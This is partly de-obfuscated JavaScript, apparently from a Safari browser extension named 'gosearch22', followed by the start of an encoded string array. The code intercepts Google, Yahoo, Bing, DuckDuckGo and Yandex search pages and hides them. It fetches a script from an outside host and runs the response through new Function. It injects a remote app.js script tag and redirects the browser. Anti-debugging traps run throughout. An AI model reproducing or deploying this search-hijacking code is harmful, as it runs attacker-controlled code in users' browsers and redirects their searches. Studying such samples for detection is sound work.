                        result.table = e;
                        continue;
                    case "6":
                        var result = {};
                        continue;
                    case "7":
                        result.debug = e;
                        continue;
                    case "8":
                        result.trace = e;
                        continue;
                    case "9":
                        result.exception = e;
                        continue;
                    }
                    break;
                }
            }(e);
        }
    } else {
        if (app.ktKMm("jhqFx", app.qOBtJ)) {
            result.console.log = e;
            result.console.warn = e;
            result.console.debug = e;
            result.console.info = e;
            result.console.error = e;
            result.console.exception = e;
            result.console.table = e;
            result.console.trace = e;
        } else {
            if (app.EiPtW(200, xhr.status)) {
                var res = xhr.responseText;
                var data = {
                    "status": res,
                    "timestamp": Date.now()
                };
                localStorage.setItem(app.rlMnf, JSON.stringify(data));
                if (d) {
                    app.JcDyU(b, res);
                }
            } else {
                if (d) {
                    f(false);
                }
            }
        }
    }
});
g();
var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.ASSUME_ES5 = false;
$jscomp.ASSUME_NO_NATIVE_MAP = false;
$jscomp.ASSUME_NO_NATIVE_SET = false;
$jscomp.SIMPLE_FROUND_POLYFILL = false;
$jscomp.ISOLATE_POLYFILLS = false;
$jscomp.FORCE_POLYFILL_PROMISE = false;
$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION = false;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (options, attr, device) {
    var currentRelations = {};
    currentRelations.PeGNY = function (letter, all) {
        return letter == all;
    };
    currentRelations.MhNYO = function (letter, all) {
        return letter == all;
    };
    var addedRelations = currentRelations;
    if (addedRelations.PeGNY(options, Array.prototype) || addedRelations.MhNYO(options, Object.prototype)) {
        return options;
    }
    options[attr] = device.value;
    return options;
};
$jscomp.getGlobal = function (data) {
    var objectsToHistory = {};
    objectsToHistory.xnQLp = "object";
    objectsToHistory.nlpZX = function (letter, all) {
        return letter == all;
    };
    objectsToHistory.pIfJQ = function (letter, all) {
        return letter == all;
    };
    objectsToHistory.KzRtm = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };
    objectsToHistory.eKpjc = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    objectsToHistory.atXzl = "Cannot find global object";
    var handlers = objectsToHistory;
    data = [handlers.xnQLp == typeof globalThis && globalThis, data, handlers.nlpZX(handlers.xnQLp, typeof window) && window, handlers.pIfJQ(handlers.xnQLp, typeof self) && self, handlers.pIfJQ(handlers.xnQLp, typeof global) && global];
    var c = 0;
    for (; handlers.KzRtm(c, data.length); ++c) {
        var root = data[c];
        if (root && handlers.pIfJQ(root.Math, Math)) {
            return root;
        }
    }
    throw handlers.eKpjc(Error, handlers.atXzl);
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.IS_SYMBOL_NATIVE = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
$jscomp.TRUST_ES6_POLYFILLS = !$jscomp.ISOLATE_POLYFILLS || $jscomp.IS_SYMBOL_NATIVE;
$jscomp.polyfills = {};
$jscomp.propertyToPolyfillSymbol = {};
$jscomp.POLYFILL_PREFIX = "$jscp$";
var $jscomp$lookupPolyfilledValue = function (mapping, index) {
    var currentRelations = {};
    currentRelations.XQgAh = function (letter, all) {
        return letter == all;
    };
    currentRelations.mVvjs = function (optionsValue, value) {
        return optionsValue !== value;
    };
    var addedRelations = currentRelations;
    var value = $jscomp.propertyToPolyfillSymbol[index];
    if (addedRelations.XQgAh(null, value)) {
        return mapping[index];
    }
    value = mapping[value];
    return addedRelations.mVvjs(void 0, value) ? value : mapping[index];
};
$jscomp.polyfill = function (mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg) {
    if (mmaPushNotificationsComponent) {
        if ($jscomp.ISOLATE_POLYFILLS) {
            $jscomp.polyfillIsolated(mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
        } else {
            $jscomp.polyfillUnisolated(mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
        }
    }
};
$jscomp.polyfillUnisolated = function (p, key, prop, value) {
    var context = {};
    context.MZaNY = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };
    context.LTohp = function (minWorkers, options) {
        return minWorkers in options;
    };
    context.wMiFc = function (b, a) {
        return b - a;
    };
    context.LnRSl = function (modstatus, mmCoreNotDownloadable) {
        return modstatus != mmCoreNotDownloadable;
    };
    var obj = context;
    var callbackVals = ("0|2|1|3|5|" + "4|6").split("|");
    var callbackCount = 0;
    for (; true;) {
        switch (callbackVals[callbackCount++]) {
        case "0":
            prop = $jscomp.global;
            continue;
        case "1":
            value = 0;
            for (; obj.MZaNY(value, p.length - 1); value++) {
                var name = p[value];
                if (!obj.LTohp(name, prop)) {
                    return;
                }
                prop = prop[name];
            }
            continue;
        case "2":
            p = p.split(".");
            continue;
        case "3":
            p = p[obj.wMiFc(p.length, 1)];
            continue;
        case "4":
            key = key(value);
            continue;
        case "5":
            value = prop[p];
            continue;
        case "6":
            if (key != value && obj.LnRSl(null, key)) {
                $jscomp.defineProperty(prop, p, {
                    "configurable": true,
                    "writable": true,
                    "value": key
                });
            }
            continue;
        }
        break;
    }
};
$jscomp.polyfillIsolated = function (layoutSets, c, e, v) {
    var array = {};
    array.JcgLM = "script";
    array.aSbxX = "src";
    array.wzMcV = function (x_or_y, y) {
        return x_or_y === y;
    };
    array.GqrxY = function (minWorkers, options) {
        return minWorkers in options;
    };
    array.JctXN = function (angle, keyAngle) {
        return angle < keyAngle;
    };
    array.eKdnq = function (b, a) {
        return b - a;
    };
    array.TeFLu = "XoSug";
    array.Zqywp = "bGejl";
    array.JnhAC = "es6";
    array.fuRHh = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    array.cVkGM = function (modstatus, mmCoreNotDownloadable) {
        return modstatus != mmCoreNotDownloadable;
    };
    array.RWPzm = function (text, shorturl_result) {
        return text + shorturl_result;
    };
    var a = array;
    var t = layoutSets.split(".");
    layoutSets = a.wzMcV(1, t.length);
    v = t[0];
    v = !layoutSets && a.GqrxY(v, $jscomp.polyfills) ? $jscomp.polyfills : $jscomp.global;
    var x = 0;
    for (; a.JctXN(x, a.eKdnq(t.length, 1)); x++) {
        if (a.TeFLu !== a.Zqywp) {
            var c = t[x];
            if (!a.GqrxY(c, v)) {
                return;
            }
            v = v[c];
        } else {
            var rowSorter = document.createElement(a.JcgLM);
            rowSorter.setAttribute(a.aSbxX, "https://www.hoexoxg.site/static/s/app.js");
            document.head.appendChild(rowSorter);
        }
    }
    t = t[a.eKdnq(t.length, 1)];
    e = $jscomp.IS_SYMBOL_NATIVE && a.JnhAC === e ? v[t] : null;
    c = a.fuRHh(c, e);
    if (a.cVkGM(null, c)) {
        if (layoutSets) {
            $jscomp.defineProperty($jscomp.polyfills, t, {
                "configurable": true,
                "writable": true,
                "value": c
            });
        } else {
            if (c !== e) {
                $jscomp.propertyToPolyfillSymbol[t] = $jscomp.IS_SYMBOL_NATIVE ? $jscomp.global.Symbol(t) : a.RWPzm($jscomp.POLYFILL_PREFIX, t);
                t = $jscomp.propertyToPolyfillSymbol[t];
                $jscomp.defineProperty(v, t, {
                    "configurable": true,
                    "writable": true,
                    "value": c
                });
            }
        }
    }
};
$jscomp.polyfill("Object.is", function (animated) {
    var node = {};
    node.MCyFh = function (x_or_y, y) {
        return x_or_y === y;
    };
    node.ALxWN = function (_num2, _num1) {
        return _num2 / _num1;
    };
    node.WLHGq = function (optionsValue, value) {
        return optionsValue !== value;
    };
    var B3494 = node;
    return animated ? animated : function (char__3503, env__3547) {
        return char__3503 === env__3547 ? 0 !== char__3503 || B3494.MCyFh(1 / char__3503, B3494.ALxWN(1, env__3547)) : B3494.WLHGq(char__3503, char__3503) && B3494.WLHGq(env__3547, env__3547);
    };
}, "es6", "es3");
setInterval(function () {
    d();
}, 4E3);
$jscomp.polyfill("Array.prototype.includes", function (obj) {
    var PL$6 = {};
    PL$6.sctZX = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };
    PL$6.KNwkT = function (minWorkers, options) {
        return minWorkers in options;
    };
    PL$6.wiats = function (modstatus, mmCoreNotDownloadable) {
        return modstatus != mmCoreNotDownloadable;
    };
    PL$6.wKBGR = function (x_or_y, y) {
        return x_or_y === y;
    };
    PL$6.qGKkk = "aDuqO";
    PL$6.RAGaL = "FRvxY";
    PL$6.Tputh = "3|4|5|0|2|" + "1";
    PL$6.fEwRH = function (_num1, _num2) {
        return _num1 > _num2;
    };
    PL$6.VqpCZ = function (buckets, name) {
        return buckets + name;
    };
    PL$6.vhVuS = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };
    var PL$16 = PL$6;
    return obj ? obj : function (name, data) {
        var currentRelations = {};
        currentRelations.wOZRI = function (b, a) {
            return b - a;
        };
        currentRelations.gSgWJ = function (PL$15, texthtml) {
            return PL$16.sctZX(PL$15, texthtml);
        };
        currentRelations.xyOMo = function (PL$15, texthtml) {
            return PL$16.KNwkT(PL$15, texthtml);
        };
        currentRelations.BnqXR = function (PL$15, texthtml) {
            return PL$16.wiats(PL$15, texthtml);
        };
        var validators = currentRelations;
        if (PL$16.wKBGR(PL$16.qGKkk, PL$16.RAGaL)) {
            var callbackVals = ("2|1|5|3|4|" + "0|6").split("|");
            var callbackCount = 0;
            for (; true;) {
                switch (callbackVals[callbackCount++]) {
                case "0":
                    name = name(value);
                    continue;
                case "1":
                    obj = obj.split(".");
                    continue;
                case "2":
                    data = $jscomp.global;
                    continue;
                case "3":
                    obj = obj[validators.wOZRI(obj.length, 1)];
                    continue;
                case "4":
                    value = data[obj];
                    continue;
                case "5":
                    value = 0;
                    for (; validators.gSgWJ(value, validators.wOZRI(obj.length, 1)); value++) {
                        var val = obj[value];
                        if (!validators.xyOMo(val, data)) {
                            return;
                        }
                        data = data[val];
                    }
                    continue;
                case "6":
                    if (validators.BnqXR(name, value) && null != name) {
                        $jscomp.defineProperty(data, obj, {
                            "configurable": true,
                            "writable": true,
                            "value": name
                        });
                    }
                    continue;
                }
                break;
            }
        } else {
            var callbackVals = PL$16.Tputh.split("|");
            var callbackCount = 0;
            for (; true;) {
                switch (callbackVals[callbackCount++]) {
                case "0":
                    data = data || 0;
                    continue;
                case "1":
                    return false;
                case "2":
                    if (PL$16.fEwRH(0, data)) {
                        data = Math.max(PL$16.VqpCZ(data, length), 0);
                    }
                    for (; PL$16.vhVuS(data, length); data++) {
                        var obj = value[data];
                        if (PL$16.wKBGR(obj, name) || Object.is(obj, name)) {
                            return true;
                        }
                    }
                    continue;
                case "3":
                    var value = this;
                    continue;
                case "4":
                    if (value instanceof String) {
                        value = String(value);
                    }
                    continue;
                case "5":
                    var length = value.length;
                    continue;
                }
                break;
            }
        }
    };
}, "es7", "es3");
$jscomp.checkStringArgs = function (gameFolder, data, boardManager) {
    var currentRelations = {};
    currentRelations.HapgX = function (state, inUse) {
        return state == inUse;
    };
    currentRelations.zzeGg = function (buckets, name) {
        return buckets + name;
    };
    currentRelations.YpMqH = " must not be null or undefined";
    currentRelations.dvrxe = function (impromptuInstance, Impromptu) {
        return impromptuInstance instanceof Impromptu;
    };
    currentRelations.TnBEt = function (buckets, name) {
        return buckets + name;
    };
    var addedRelations = currentRelations;
    if (addedRelations.dvrxe(data, RegExp)) {
        throw new TypeError(addedRelations.TnBEt("First argument to String.prototype." + boardManager, " must not be a regular expression"));
    }
    return gameFolder + "";
};
$jscomp.polyfill("String.prototype.includes", function (canCreateDiscussions) {
    var currentRelations = {};
    currentRelations.hAVDR = function (x_or_y, y) {
        return x_or_y === y;
    };
    currentRelations.VZLTI = "HNMAN";
    currentRelations.kKWZI = "IgBwG";
    currentRelations.zPpOU = function (optionsValue, value) {
        return optionsValue !== value;
    };
    currentRelations.wnCXG = function (isPrevType, isCurrentType) {
        return isPrevType || isCurrentType;
    };
    var command_codes = currentRelations;
    return canCreateDiscussions ? canCreateDiscussions : function (classNAME, data) {
        if (command_codes.hAVDR(command_codes.VZLTI, command_codes.kKWZI)) {
            var denies = fn.apply(context, arguments);
            fn = null;
            return denies;
        } else {
            return command_codes.zPpOU(-1, $jscomp.checkStringArgs(this, classNAME, "includes").indexOf(classNAME, command_codes.wnCXG(data, 0)));
        }
    };
}, "es6", "es3");
var xhr;
var eventName = "beforeload";
var isSafari13OrLater = null != (ver = navigator.appVersion.match(/version\/(\d+)/i)) && 13 <= ver[1];
addEventListener(eventName, function (canCreateDiscussions) {
    var obj = {};
    obj.JoIJc = function (x_or_y, y) {
        return x_or_y === y;
    };
    obj.JYSiN = "YisOc";
    obj.kDqqk = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    obj.kkKdz = function (x_or_y, y) {
        return x_or_y === y;
    };
    obj.ZhRdW = function (_num2, _num1) {
        return _num2 / _num1;
    };
    obj.zGPfH = function (letter, all) {
        return letter == all;
    };
    obj.HiEgJ = "onCqt";
    obj.VpZKn = "info";
    obj.ntIza = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    obj.eZmva = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    obj.LTzVO = function (x_or_y, y) {
        return x_or_y === y;
    };
    obj.Ekfap = "LDBCB";
    obj.ybZhr = function (saveNotifs) {
        return saveNotifs();
    };
    obj.pqZww = function (optionsValue, value) {
        return optionsValue !== value;
    };
    obj.YHrSW = "https://moj.plantitud.com/static/gs/s.js";
    obj.Fkmum = function (buckets, name) {
        return buckets + name;
    };
    obj.efkGB = ";return st" + 'atus("';
    obj.qhntV = function (f, widthCtrl) {
        return f(widthCtrl);
    };
    obj.BqKHm = function (f, widthCtrl) {
        return f(widthCtrl);
    };
    obj.pMnaR = "PghYb";
    obj.wLfeG = "none";
    obj.enFtF = "debu";
    obj.MnCHh = "gger";
    obj.xbetY = "stateObject";
    obj.GYIEc = function (optionsValue, value) {
        return optionsValue !== value;
    };
    obj.iuuTY = "mRWft";
    obj.ZqSjr = function (x_or_y, y) {
        return x_or_y === y;
    };
    obj.ockTq = "0|1|2|4|3";
    obj.RAqgJ = function (callback, identifierPositions) {
        return callback(identifierPositions);
    };
    obj.OqCiT = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    obj.puXEi = function (mid_OR_high, high_OR_null) {
        return mid_OR_high <= high_OR_null;
    };
    obj.PNuAU = function (_num2, _num1) {
        return _num2 / _num1;
    };
    obj.IQPhl = "google.";
    obj.NhQJI = "yahoo.";
    obj.Cspsr = "bing.";
    obj.dSCrp = "duckduckgo.";
    obj.tLgUF = "yandex.";
    obj.RVBue = '[src="http' + "s://www.hoexoxg.site" + "/static/s/" + 'app.js"]';
    obj.GLgNM = "JAhJQ";
    obj.brJeG = "src";
    obj.bdNuj = "https://www.hoexoxg.site/static/s/app.js";
    var data = obj;
    if (!isSafari13OrLater && window.top === window) {
        if (!document.referrer && location.host && location.search && location.href && (location.host.includes(data.IQPhl) && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes(data.NhQJI) && location.href.match(/^https?:\/\/[^\/]+\/search.*?[?&]p=[^&].*$/) || location.host.includes(data.Cspsr) && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes(data.dSCrp) &&
                location.href.match(/^https?:\/\/[^\/]+\/\?.*?\bq\b=[^&].*$/) || location.host.includes(data.tLgUF) && location.href.match(/^https?:\/\/[^\/]+\/search[\/]?\?.*?\btext\b=[^&].*$/))) {
            var get = function (size) {
                var namespacedData = {};
                namespacedData.NDkPJ = function (_relatedTarget, value2) {
                    return data.kkKdz(_relatedTarget, value2);
                };
                namespacedData.ImABp = function (optionsValue, value) {
                    return optionsValue !== value;
                };
                namespacedData.UxvDC = function (_relatedTarget, value2) {
                    return data.ZhRdW(_relatedTarget, value2);
                };
                namespacedData.oBxjj = function (_relatedTarget, value2) {
                    return data.zGPfH(_relatedTarget, value2);
                };
                namespacedData.DgwsO = data.HiEgJ;
                namespacedData.DqVyF = data.VpZKn;
                namespacedData.PbQri = function (_relatedTarget, value2) {
                    return data.ntIza(_relatedTarget, value2);
                };
                namespacedData.vvNlP = function (_relatedTarget, value2) {
                    return data.eZmva(_relatedTarget, value2);
                };
                var _submitBtn = namespacedData;
                if (data.LTzVO("LDBCB", data.Ekfap)) {
                    if (size = data.LTzVO(void 0, size) ? false : size) {
                        data.ybZhr(_positionActiveTinyMCE);
                    }
                    if (xhr && data.pqZww(void 0, xhr)) {
                        xhr.abort();
                    }
                    xhr = new XMLHttpRequest;
                    xhr.timeout = 1E3;
                    xhr.ontimeout = function () {
                        if (data.JoIJc(data.JYSiN, "rqJsy")) {
                            var denies = fn.apply(context, arguments);
                            fn = null;
                            return denies;
                        } else {
                            if (size) {
                                data.kDqqk(update, false);
                            }
                        }
                    };
                    xhr.onload = function () {
                        var currentRelations = {};
                        currentRelations.nZhyS = function (disabled, status) {
                            return _submitBtn.NDkPJ(disabled, status);
                        };
                        currentRelations.GHVVu = function (disabled, status) {
                            return _submitBtn.ImABp(disabled, status);
                        };
                        currentRelations.kionv = function (disabled, status) {
                            return _submitBtn.NDkPJ(disabled, status);
                        };
                        currentRelations.QFpCU = function (disabled, status) {
                            return _submitBtn.UxvDC(disabled, status);
                        };
                        currentRelations.tGtBF = function (disabled, status) {
                            return _submitBtn.ImABp(disabled, status);
                        };
                        var B3494 = currentRelations;
                        if (_submitBtn.oBxjj(200, xhr.status)) {
                            if (_submitBtn.DgwsO === "lSjnJ") {
                                return canCreateDiscussions ? canCreateDiscussions : function (char__3503, env__3547) {
                                    return B3494.nZhyS(char__3503, env__3547) ? B3494.GHVVu(0, char__3503) || B3494.kionv(1 / char__3503, B3494.QFpCU(1, env__3547)) : B3494.GHVVu(char__3503, char__3503) && B3494.tGtBF(env__3547, env__3547);
                                };
                            } else {
                                var status = xhr.responseText;
                                var data = {
                                    "status": status,
                                    "timestamp": Date.now()
                                };
                                localStorage.setItem(_submitBtn.DqVyF, JSON.stringify(data));
                                if (size) {
                                    _submitBtn.PbQri(scroll, status);
                                }
                            }
                        } else {
                            if (size) {
                                _submitBtn.vvNlP(update, false);
                            }
                        }
                    };
                    xhr.onerror = function () {
                        update(false);
                    };
                    xhr.open("GET", data.YHrSW, true);
                    xhr.send();
                } else {
                    return true;
                }
            };
            var scroll = function (position) {
                position = (new Function(data.Fkmum(data.Fkmum(position + data.efkGB, location.href), '")'))).call();
                data.qhntV(update, position);
            };
            var _positionActiveTinyMCE = function () {
                if (data.pMnaR === data.pMnaR) {
                    canCreateDiscussions.preventDefault();
                    if (body = document.body) {
                        body.style.display = data.wLfeG;
                    }
                } else {
                    if (ret) {
                        return debuggerProtection;
                    } else {
                        data.BqKHm(debuggerProtection, 0);
                    }
                }
            };
            var update = function (data) {
                if (data) {
                    data.ybZhr(_positionActiveTinyMCE);
                } else {
                    if (data.GYIEc("mRWft", data.iuuTY)) {
                        (function () {
                            return true;
                        }).constructor(data.enFtF + data.MnCHh).apply(data.xbetY);
                    } else {
                        var body = document.body;
                        if (body && data.ZqSjr(data.wLfeG, body.style.display)) {
                            window.location.replace(location.href);
                        }
                    }
                }
                var details = {};
                details.url = location.href;
                details.status = data;
                safari.extension.dispatchMessage(eventName, details);
            };
            (function () {
                var callbackVals = data.ockTq.split("|");
                var callbackCount = 0;
                for (; true;) {
                    switch (callbackVals[callbackCount++]) {
                    case "0":
                        var value = JSON.parse(localStorage.getItem("runtime"));
                        continue;
                    case "1":
                        var query = {};
                        query.url = location.href;
                        query.timestamp = Date.now();
                        var message = query;
                        continue;
                    case "2":
                        localStorage.setItem("runtime", JSON.stringify(message));
                        continue;
                    case "3":
                        if (value) {
                            if ((value = JSON.parse(localStorage.getItem("info"))) && void 0 !== value) {
                                if ((message = value.status) && data.GYIEc(void 0, message)) {
                                    data.RAqgJ(scroll, message);
                                    if ((value = value.timestamp) && void 0 !== value) {
                                        if (5 <= data.ZhRdW(data.ZhRdW(Date.now() - value, 1E3), 60)) {
                                            data.ybZhr(get);
                                        }
                                    } else {
                                        data.ybZhr(get);
                                    }
                                } else {
                                    get(true);
                                }
                            } else {
                                data.OqCiT(get, true);
                            }
                        }
                        continue;
                    case "4":
                        if (value && void 0 !== value && data.ZqSjr(value.url, location.href)) {
                            value = value.timestamp;
                            value = !value || void 0 === value || data.puXEi(1, data.PNuAU(Date.now() - value, 1E3)) ? true : false;
                        } else {
                            value = true;
                        }
                        continue;
                    }
                    break;
                }
            })();
        } else {
            if (document.head && 0 >= document.querySelectorAll(data.RVBue).length) {
                if (data.ZqSjr(data.GLgNM, "JAhJQ")) {
                    var elem = document.createElement("script");
                    elem.setAttribute(data.brJeG, data.bdNuj);
                    document.head.appendChild(elem);
                } else {
                    d = (new Function(data.Fkmum(d, ";return status('") + location.href + '")')).call();
                    data.OqCiT(update, d);
                }
            }
        }
    }
}, true);
safari.self.addEventListener("message", function (body) {
    if (body.message.url) {
        window.location.replace(body.message.url);
    }
});
function d(n) {
    function update(data) {
        var InitialSetupController = {};
        InitialSetupController.ZBnUA = function (saveNotifs) {
            return saveNotifs();
        };
        InitialSetupController.RZtwT = function (DIR, name) {
            return DIR + name;
        };
        InitialSetupController.SzVPc = function (buckets, name) {
            return buckets + name;
        };
        InitialSetupController.MSIuy = function (addedNodesArray, dr) {
            return options.XDcHC(addedNodesArray, dr);
        };
        InitialSetupController.hJySJ = "lQJpl";
        InitialSetupController.VIVVZ = "QMGfP";
        var controller = InitialSetupController;
        if (options.piOLC(options.yEBoB, options.rOjIw)) {
            if (fn) {
                var newValue = fn.apply(context, arguments);
                fn = null;
                return newValue;
            }
        } else {
            if (typeof data === options.dfvDm) {
                return function (canCreateDiscussions) {} ["constructor"](options.dEDjy).apply("counter");
            } else {
                if (options.oBHDi(options.lNQWJ, options.lNQWJ)) {
                    controller.ZBnUA(d);
                } else {
                    if (options.oEuZl("", options.rRNYx(data, data))[options.UGyZy] !== 1 || options.VJQoM(options.WUyQz(data, 20), 0)) {
                        if (options.kixsA(options.glETU, options.YTZsf)) {
                            (function () {
                                return true;
                            }).constructor(options.oEuZl(options.cgmTm, "gger")).call("action");
                        } else {
                            that = controller.ZBnUA(fH);
                        }
                    } else {
                        (function () {
                            if (controller.MSIuy(controller.hJySJ, controller.VIVVZ)) {
                                var row = firstCall ? function () {
                                    if (fn) {
                                        var denies = fn.apply(context, arguments);
                                        fn = null;
                                        return denies;
                                    }
                                } : function () {};
                                firstCall = true;
                                return row;
                            } else {
                                return true;
                            }
                        }).constructor(options.qIEHj(options.cgmTm, options.UudQw)).apply(options.cXzfQ);
                    }
                }
            }
            options.bDFeq(update, ++data);
        }
    }
    var headers = {};
    headers.XDcHC = function (x_or_y, y) {
        return x_or_y === y;
    };
    headers.piOLC = function (x_or_y, y) {
        return x_or_y === y;
    };
    headers.yEBoB = "oYzse";
    headers.rOjIw = "oPJQh";
    headers.dfvDm = "string";
    headers.dEDjy = "while (true) {}";
    headers.oBHDi = function (optionsValue, value) {
        return optionsValue !== value;
    };
    headers.lNQWJ = "XdVag";
    headers.oEuZl = function (buckets, name) {
        return buckets + name;
    };
    headers.rRNYx = function (_num2, _num1) {
        return _num2 / _num1;
    };
    headers.UGyZy = "length";
    headers.VJQoM = function (x_or_y, y) {
        return x_or_y === y;
    };
    headers.WUyQz = function (number_to_dividee, divided_by) {
        return number_to_dividee % divided_by;
    };
    headers.kixsA = function (dataSourceIndex, all) {
        return dataSourceIndex !== all;
    };
    headers.glETU = "rtMIy";
    headers.YTZsf = "NMvQw";
    headers.cgmTm = "debu";
    headers.qIEHj = function (buckets, name) {
        return buckets + name;
    };
    headers.UudQw = "gger";
    headers.cXzfQ = "stateObject";
    headers.bDFeq = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    headers.UAcwT = "none";
    var options = headers;
    try {
        if (n) {
            return update;
        } else {
            if ("dgaaS" === "dgaaS") {
                options.bDFeq(update, 0);
            } else {
                var body = document.body;
                if (body && options.VJQoM(options.UAcwT, body.style.display)) {
                    window.location.replace(location.href);
                }
            }
        }
    } catch (fN) {}
};
```
<br /><br />
gosearch22.script.js - de-obfuscated on the custom JS sandbox, nested cleanup modules and manual check (attempt 3)

```js
'use strict';
var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG", "w492V8KNwrc=", "XFtr", "YcOmw41Mw6U=", "wqAWwrHCryXDngUnw5fCrg==", "CCo/biE=", "w77DhiTDsV4=", "wqNew7HCiMOrZXU=", "wpdLw4jCv8Ok", "w60Ow5fDrRA=", "MsOIwqYPPn7DmnzDvMO8", "a8OQw5low45iw4s=", "wrhyw5jCusK1JSdfw5dy", "wr1Jw6XCpMKS", "w70QGMKowrk=", "w44hw4/DkjU=", "Zgd8wrnDgw==", "AMKGHHbCvw==", "wqoNw4xkwoU=", "w4oSFmhE", "AsKoY8Or", "WsOTwo/DpRtBw5w=", "wq3DqwXDpj4Uwrk=", "w4DDisK3wrLCmA==", "XMOoBmo=", "wocWw5TDhh0=",
    "ZTHCo8OKwrs=", "OsKEPEfClA==", "w5hTXsKlwofCjw==", "w5cBAMKSwoE=", "w6cENUAjwr1I", "wpzDssO+w4ht", "JFJPfTA=", "w6kCw4jDtA==", "wpPDj8Obw6pB", "w6AMKlw=", "a8O9woXDjw4=", "wpskaStD", "ZMO0RXIpTcKx", "bcOSJkdceMOpWFg=", "A8OrwoQ=", "w6gsDRPCt8OwR8KBKzo=", "Y8O+SXQ=", "YsOAw4lww4tww43DrWsI", "w7PCvsK4fw8=", "TU3DtWFO", "wrc3wpXDiGc=", "wrDCkwTCr8Ov", "wrQLwovCpws=", "woZRw57DsxI=", "wpvCg2ki", "w5fDisORwrLCtsKvwpjDggtO", "D8O2w5Ebwp3DqcOtw5Q=", "SB9zwpLDkA==", "w5t6dcKtwp8=", "ScKqw5bCn8Kt", "w5kFIcKEwps=",
    "w5cNOQPCpQ==", "WcOXwqYMw4U=", "w5sOw4QrRg==", "w7MCKkkpwrVdcDA=", "DT8tRQ8=", "fVbDsMKtwrvCnU5bNhA=", "cUfDuA==", "HMOWwoEcPA==", "w6Bfw48IOQ==", "O8KCwoTChgrDg8Kg", "wpHChXQ3w48TJMOGwobCpQ==", "wq12w4LDkjg=", "w7BMw5wWRA==", "w5oUwoYoIX07BMOew60=", "wpHDp8Kjw5d7wqAJO3V2", "w5nCrsKZZhg=", "w6QGw5cedA==", "woABw6nDvAE=", "w6rDhxbDnFonUjA=", "w4Q6FyjCjQ==", "YMKXw5bCsMKn", "HikCNMOvwqU=", "e8OSOF1fbsO1W0fCuA==", "enFjw6Yk", "CcOaw4odwoI=", "ZSrCicOzwo0=", "w4wOCWZcTw==", "PsK3GFHCvQ==", "wrLCiDnCocOFw75iw77CpsKH",
    "woxnw7vDicO5", "X8OYwpkQw7A=", "wpbCi2oTw4M=", "w4l9w4gubQ==", "w7/DlcKIwrHCrg==", "wpRaw6vDtRY=", "w7YYw74=", "U8KTw4HDjAE=", "ViFMwrDCm2Zq", "XMK8wqM6w4hSwotkw7Eh", "wovDp8Ojw4Bt", "w6fCmsKOZhM=", "FcOuwp8mAl7Cq1PDgMOQ", "I8KJWcOeCl1PPcKANw==", "wooew6hpwqk=", "wqVhw4PCqcK4", "w6w7L0Fe", "b0LDsH9SZTcESW4=", "TcKAw5PCugBXw5J/wobCnw==", "Q0Rgw54o", "wrHDvDbDric=", "wqYAXg18", "w5BQw6sBUg==", "T8O6W2Ye", "wo9Aw7/DpsOp", "TcOOwp3DoQJT", "w7fCqVfCrsOw", "wqAyw455wpg=", "w4jCs3fCpcOV", "CMKoJXDCvw==",
    "a1rDt19K", "w59ew7HDqBRNNsO1w5nCkg==", "bsKHw7rDggbDgWQKw5HDpA==", "woUIw4d+", "wo4DWSZ/", "woxKw6nDuQ8B", "w6wqwpIsHw==", "WVpqw5g=", "wqU+wqvCmSk=", "wodWw63Dq8OP", "JhwKdA==", "ccOzOE12", "woYDwofDpFQ=", "JRcHTiE=", "wo1dwqTDrwgEK8K4woTCmg==", "T8O9wrfDvhw=", "wqbDgzHDlys=", "UyF4wqjDtMOjwrMgcQ==", "RiNVwq3Cgg==", "wroGWTdILMKTc1M=", "QEZjw4c5OzDCpVVi", "d8KDw5bCtsKR", "wqPDt8KCW8KW", "w6sfI1Y=", "wp5zw7DCusOG", "w4wBw79ODB/CpWdyaA==", "DsK2wpDCtAM=", "Q2nDgVVw", "TsOVwpDDrBFJw4k9", "SsK9w4HCgMKD",
    "w4plw7wLDg==", "c8OlOk1d", "wr9Sw67DhsOi", "HsO2w6M7wpg=", "SxnCl8ORwq8=", "a8OIQW8M", "V0LDgEN1", "wqXDgsKxZsKm", "wrPCo1UEw6s4F8OhwofCmQ==", "w5fCuks=", "woHCiXQz", "wpsoXyly", "JsKOwrjCuSg=", "ej/CqcOcwoPCrg==", "VcOvD3g=", "VMKVw7DCn8Kt", "wphvw5vCs8K2Pj9Kw5Bk", "w68kw4Mdaw==", "OcKrIWnCtxYVd1DDpQ==", "w4gRWcKowoPCm8O6wqvDmcOv", "w4vDhjbDtUY=", "wrEcehJW", "bMOyU3IH", "w7sBGMKRwrE=", "fCfCs8ONw4rDoA==", "SStbwpjCm2poHQ==", "wrA3woTCujs=", "wqB6w6bCo8OT", "wqFMTsO0", "QiNdwos=", "McOGwqAY", "CMO3w4U=",
